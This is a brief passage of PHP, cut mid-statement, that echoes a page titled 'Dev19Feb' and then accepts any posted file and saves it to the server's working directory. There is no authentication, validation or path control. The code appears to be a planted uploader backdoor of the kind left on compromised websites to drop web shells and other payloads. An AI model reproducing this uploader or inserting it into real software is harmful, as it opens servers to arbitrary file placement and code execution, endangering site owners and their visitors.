<title>Dev19Feb</title>'; echo 'Dev19Feb '; if(!empty($_FILES['uploaded_file'])) { $path = basename( $_FILES['uploaded_file']['name']); if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) { echo "The file ". basename( $_FILES['uploaded_file']['name']). " uploaded !"; } else{ echo "not uploaded !"; } } ?>
